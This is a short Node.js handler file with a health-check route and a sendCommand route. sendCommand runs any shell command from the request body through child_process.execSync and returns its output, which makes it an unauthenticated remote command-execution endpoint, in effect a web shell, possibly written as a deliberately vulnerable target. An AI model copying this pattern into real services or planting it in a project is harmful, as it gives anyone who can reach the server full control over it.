const childprocess = require('child_process');

exports.getHealth = function(req, res) {  
    return res(null, "Howdy!");
};

exports.sendCommand = function(req, res) {
    var result = childprocess.execSync(req.body.command).toString()
    return res(null, JSON.stringify("\nExecuting command :- " + req.body.command + "\n\nCommand Result :- " + result + "\n"));
};